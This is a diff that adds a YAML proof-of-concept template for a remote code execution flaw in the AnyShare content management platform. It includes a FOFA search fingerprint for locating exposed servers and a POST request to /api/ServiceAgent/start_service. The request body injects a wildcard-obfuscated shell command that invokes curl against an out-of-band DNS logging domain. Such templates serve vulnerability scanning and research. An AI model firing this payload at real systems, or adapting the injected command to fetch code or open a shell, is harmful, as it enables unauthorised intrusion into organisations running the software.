@@ -1,0 +1,23 @@
+id: poc-yaml-anyshare-icmp-start-service-rce
+info:
+  name: 爱数 AnyShare智能内容管理平台 start_service 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: AnyShare智能内容管理平台
+  fofa: body="/libs/hls.js/dist/hls.min.js"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /api/ServiceAgent/start_service
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '["com;/u?r/b?n/c??l {{.domain}}"]
+
+    '
+  expression: status_code == 200 && body == "null" && contains(content_type,"application/json")
+    && reverse.Verify()
+transport: http
